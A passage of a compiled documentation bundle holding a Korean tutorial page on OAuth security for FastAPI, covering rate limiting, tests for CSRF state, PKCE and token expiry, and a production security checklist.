templates.TemplateResponse(\n        "profile.html",\n        {"request": request, "user": user}  # \uc790\ub3d9 \uc774\uc2a4\ucf00\uc774\ud504\n    )\n'})}),"\n",(0,r.jsx)(n.h2,{id:"-rate-limiting",children:"\ud83d\udd12 Rate Limiting"}),"\n",(0,r.jsx)(n.h3,{id:"1-fastapi-rate-limiting",children:"1. FastAPI Rate Limiting"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'from fastapi import Request, HTTPException\nfrom collections import defaultdict\nfrom datetime import datetime, timedelta\n\n# Rate Limit \uc800\uc7a5\uc18c\nrate_limit_store = defaultdict(list)\n\ndef rate_limit(max_requests: int, window_seconds: int):\n    """Rate Limiting \ub370\ucf54\ub808\uc774\ud130"""\n\n    def decorator(func):\n        async def wrapper(request: Request, *args, **kwargs):\n            # \ud074\ub77c\uc774\uc5b8\ud2b8 \uc2dd\ubcc4 (IP \ub610\ub294 User ID)\n            client_id = request.client.host\n\n            # \ud604\uc7ac \uc2dc\uac04\n            now = datetime.now()\n            window_start = now - timedelta(seconds=window_seconds)\n\n            # \uc708\ub3c4\uc6b0 \ub0b4 \uc694\uccad \ud544\ud130\ub9c1\n            requests = rate_limit_store[client_id]\n            requests = [r for r in requests if r > window_start]\n            rate_limit_store[client_id] = requests\n\n            # Rate Limit \ud655\uc778\n            if len(requests) >= max_requests:\n                raise HTTPException(\n                    status_code=429,\n                    detail=f"Rate limit exceeded. Max {max_requests} requests per {window_seconds} seconds"\n                )\n\n            # \uc694\uccad \uae30\ub85d\n            requests.append(now)\n\n            return await func(request, *args, **kwargs)\n\n        return wrapper\n    return decorator\n\n# \uc0ac\uc6a9\n@app.post(\'/token\')\n@rate_limit(max_requests=10, window_seconds=60)  # 10 req/min\nasync def token(request: Request):\n    """Rate Limited Token Endpoint"""\n    # ...\n'})}),"\n",(0,r.jsx)(n.h3,{id:"2-redis\ub85c-rate-limiting",children:"2. Redis\ub85c Rate Limiting"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'import redis\nfrom datetime import timedelta\n\nredis_client = redis.Redis(host=\'localhost\', port=6379, db=0)\n\nasync def check_rate_limit(\n    client_id: str,\n    max_requests: int,\n    window_seconds: int\n):\n    """Redis \uae30\ubc18 Rate Limiting"""\n\n    key = f"rate_limit:{client_id}"\n    current = redis_client.get(key)\n\n    if current is None:\n        # \uccab \uc694\uccad\n        redis_client.setex(key, window_seconds, 1)\n        return True\n\n    current = int(current)\n\n    if current >= max_requests:\n        # Rate limit \ucd08\uacfc\n        return False\n\n    # \uc694\uccad \uc99d\uac00\n    redis_client.incr(key)\n    return True\n\n# \ubbf8\ub4e4\uc6e8\uc5b4\ub85c \uc801\uc6a9\nclass RateLimitMiddleware(BaseHTTPMiddleware):\n    async def dispatch(self, request, call_next):\n        client_id = request.client.host\n\n        # Rate Limit \ud655\uc778\n        if not await check_rate_limit(client_id, max_requests=100, window_seconds=60):\n            return JSONResponse(\n                status_code=429,\n                content={"detail": "Too many requests"}\n            )\n\n        return await call_next(request)\n\napp.add_middleware(RateLimitMiddleware)\n'})}),"\n",(0,r.jsx)(n.h2,{id:"-\ubcf4\uc548-\ud14c\uc2a4\ud2b8",children:"\ud83e\uddea \ubcf4\uc548 \ud14c\uc2a4\ud2b8"}),"\n",(0,r.jsx)(n.h3,{id:"1-csrf-\ud14c\uc2a4\ud2b8",children:"1. CSRF \ud14c\uc2a4\ud2b8"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"import pytest\nfrom fastapi.testclient import TestClient\n\ndef test_csrf_protection():\n    \"\"\"CSRF \ubcf4\ud638 \ud14c\uc2a4\ud2b8\"\"\"\n\n    client = TestClient(app)\n\n    # 1. \uc815\uc0c1 \ud50c\ub85c\uc6b0\n    response = client.get('/login', follow_redirects=False)\n    auth_url = response.headers['location']\n\n    # State \ucd94\ucd9c\n    import urllib.parse\n    parsed = urllib.parse.urlparse(auth_url)\n    state = urllib.parse.parse_qs(parsed.query)['state'][0]\n\n    # Callback (\uc815\uc0c1 state)\n    response = client.get(f'/callback?code=test-code&state={state}')\n    assert response.status_code == 200\n\n    # 2. CSRF \uacf5\uaca9 \uc2dc\ub3c4\n    response = client.get('/callback?code=test-code&state=invalid-state')\n    assert response.status_code == 400  # \uac70\ubd80\ub418\uc5b4\uc57c \ud568\n"})}),"\n",(0,r.jsx)(n.h3,{id:"2-pkce-\ud14c\uc2a4\ud2b8",children:"2. PKCE \ud14c\uc2a4\ud2b8"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"def test_pkce_validation():\n    \"\"\"PKCE \uac80\uc99d \ud14c\uc2a4\ud2b8\"\"\"\n\n    client = TestClient(app)\n\n    # 1. \uc815\uc0c1 \ud50c\ub85c\uc6b0\n    response = client.get('/login', follow_redirects=False)\n\n    # Code Verifier\uac00 \uc138\uc158\uc5d0 \uc800\uc7a5\ub418\uc5c8\ub294\uc9c0 \ud655\uc778\n    assert 'code_verifier' in client.cookies\n\n    # 2. Verifier \uc5c6\uc774 Token \uc694\uccad (\uc2e4\ud328\ud574\uc57c \ud568)\n    response = client.get('/callback?code=test-code&state=valid-state')\n    # Verifier \uc81c\uac70\n    del client.cookies['code_verifier']\n\n    # Token \uad50\ud658 \uc2dc\ub3c4\n    # ... (\uc2e4\ud328\ud574\uc57c \ud568)\n"})}),"\n",(0,r.jsx)(n.h3,{id:"3-\ud1a0\ud070-\ub9cc\ub8cc-\ud14c\uc2a4\ud2b8",children:"3. \ud1a0\ud070 \ub9cc\ub8cc \ud14c\uc2a4\ud2b8"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'from freezegun import freeze_time\n\ndef test_token_expiration():\n    """\ud1a0\ud070 \ub9cc\ub8cc \ud14c\uc2a4\ud2b8"""\n\n    # Token \uc0dd\uc131\n    token = create_access_token(\n        data={"sub": "user123"},\n        expires_delta=timedelta(minutes=15)\n    )\n\n    # \uc989\uc2dc \uac80\uc99d (\uc131\uacf5)\n    payload = verify_token(token)\n    assert payload[\'sub\'] == "user123"\n\n    # 16\ubd84 \ud6c4 (\uc2e4\ud328)\n    with freeze_time(datetime.utcnow() + timedelta(minutes=16)):\n        with pytest.raises(HTTPException) as exc_info:\n            verify_token(token)\n        assert exc_info.value.status_code == 401\n'})}),"\n",(0,r.jsx)(n.h2,{id:"-\ud504\ub85c\ub355\uc158-\uccb4\ud06c\ub9ac\uc2a4\ud2b8",children:"\ud83d\udccb \ud504\ub85c\ub355\uc158 \uccb4\ud06c\ub9ac\uc2a4\ud2b8"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'production_checklist = {\n    "\ud544\uc218": {\n        "\u2705 HTTPS": "\ubaa8\ub4e0 \uc5d4\ub4dc\ud3ec\uc778\ud2b8",\n        "\u2705 State Parameter": "CSRF \ubc29\uc9c0",\n        "\u2705 PKCE": "\ubaa8\ub4e0 \ud074\ub77c\uc774\uc5b8\ud2b8",\n        "\u2705 Redirect URI \uac80\uc99d": "\ub4f1\ub85d\ub41c URI\ub9cc",\n        "\u2705 \uc9e7\uc740 Token \uc218\uba85": "15-30\ubd84",\n        "\u2705 \ud658\uacbd\ubcc0\uc218": "\ube44\ubc00\ud0a4 \uad00\ub9ac",\n        "\u2705 Rate Limiting": "DoS \ubc29\uc9c0",\n        "\u2705 \uc785\ub825 \uac80\uc99d": "\ubaa8\ub4e0 \ud30c\ub77c\ubbf8\ud130",\n        "\u2705 HttpOnly Cookie": "\ud1a0\ud070 \uc800\uc7a5"\n    },\n    "\uad8c\uc7a5": {\n        "\u2705 Refresh Token Rotation": "\uc7ac\uc0ac\uc6a9 \ubc29\uc9c0",\n        "\u2705 Token Revocation": "\ub85c\uadf8\uc544\uc6c3 \uc9c0\uc6d0",\n        "\u2705 \ub85c\uae45": "\ubcf4\uc548 \uc774\ubca4\ud2b8 \uae30\ub85d",\n        "\u2705 \ubaa8\ub2c8\ud130\ub9c1": "\uc774\uc0c1 \ud589\uc704 \ud0d0\uc9c0",\n        "\u2705 \uc815\uae30 \ud0a4 \uc21c\ud658": "\ube44\ubc00\ud0a4 \uad50\uccb4",\n        "\u2705 \ubcf4\uc548 \ud5e4\ub354": "HSTS, CSP \ub4f1",\n        "\u2705 \uac10\uc0ac \ub85c\uadf8": "\uc778\uc99d \uc774\ubca4\ud2b8"\n    }\n}\n'})}),"\n",(0,r.jsx)(n.h2,{id:"-\uad00\ub828-\ubb38\uc11c",children:"\ud83d\udd17 \uad00\ub828 \ubb38\uc11c"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"./pkce",children:"PKCE \uad6c\ud604"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"./token-management",children:"\ud1a0\ud070 \uad00\ub9ac"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"../basic/flows",children:"Authorization Flows"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"../intermediate/fastapi-basics",children:"FastAPI OAuth \uae30\ucd08"})}),"\n"]}),"\n",(0,r.jsx)(n.h2,{id:"-\ub2e4\uc74c-\ub2e8\uacc4",children:"\ud83c\udfaf \ub2e4\uc74c \ub2e8\uacc4"}),"\n",(0,r.jsx)(n.p,{children:"\ubcf4\uc548\uc744 \uac15\ud654\ud588\ub2e4\uba74, \uc774\uc81c \ud1a0\ud070 \uad00\ub9ac \uc804\ub7b5\uc744 \ubc30\uc6cc\ubd05\uc2dc\ub2e4!"}),"\n",(0,r.jsxs)(n.p,{children:["\ud83d\udc49 ",(0,r.jsx)(n.a,{href:"./token-management",children:"\ud1a0\ud070 \uad00\ub9ac"})]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"\ud83d\udca1 \ud301"}),": \ubcf4\uc548\uc740 \uc120\ud0dd\uc774 \uc544\ub2cc \ud544\uc218\uc785\ub2c8\ub2e4. \uc774 \uccb4\ud06c\ub9ac\uc2a4\ud2b8\ub97c \ud504\ub85c\ub355\uc158 \ubc30\ud3ec \uc804 \ubc18\ub4dc\uc2dc \ud655\uc778\ud558\uc138\uc694!"]})]})}function u(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},8453:(e,n,t)=>{t.d(n,{R:()=>a,x:()=>o});var s=t(6540);const r={},i=s.createContext(r);function a(e){const n=s.useContext(i);return s.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:a(e.components),s.createElement(i.Provider,{value:n},e.children)}}}]);